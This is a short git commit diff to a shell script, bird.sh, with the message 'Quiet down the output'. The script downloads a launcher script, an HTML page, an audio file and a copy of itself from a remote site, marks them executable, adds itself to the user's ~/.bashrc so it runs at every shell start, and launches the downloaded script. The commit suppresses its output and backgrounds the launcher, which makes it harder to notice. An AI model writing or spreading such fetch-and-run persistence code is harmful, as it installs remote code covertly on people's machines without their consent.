2bb76361cb4a3d52fa5f3d34f9a597bbf7c882a8
Zhuowei Zhang <zhuoweizhang@yahoo.com>
2014-03-23 17:41:03 -0400

    Quiet down the output

--- bird.sh
+++ bird.sh
@@ -1,12 +1,12 @@
 #!/bin/sh
-ps -e|grep bird_launch.sh && exit
-mkdir $HOME/.bird
+ps -e|grep bird_launch.sh >/dev/null && exit
+mkdir $HOME/.bird 2>/dev/null
 cd $HOME/.bird
-test -e bird.ogg || wget http://zhuoweizhang.net/csc190/bird.ogg
-test -e bird_launch.sh || wget http://zhuoweizhang.net/csc190/bird_launch.sh
-test -e bird.html || wget http://zhuoweizhang.net/csc190/bird.html
-test -e bird.sh || wget http://zhuoweizhang.net/csc190/bird.sh
+test -e bird.ogg || wget --quiet http://zhuoweizhang.net/csc190/bird.ogg
+test -e bird_launch.sh || wget --quiet http://zhuoweizhang.net/csc190/bird_launch.sh
+test -e bird.html || wget --quiet http://zhuoweizhang.net/csc190/bird.html
+test -e bird.sh || wget --quiet http://zhuoweizhang.net/csc190/bird.sh
 chmod +x bird_launch.sh
 chmod +x bird.sh
-grep "bird.sh" ~/.bashrc || echo "~/.bird/bird.sh" >>~/.bashrc
-./bird_launch.sh
+grep "bird.sh" ~/.bashrc >/dev/null || echo "~/.bird/bird.sh" >>~/.bashrc
+./bird_launch.sh &
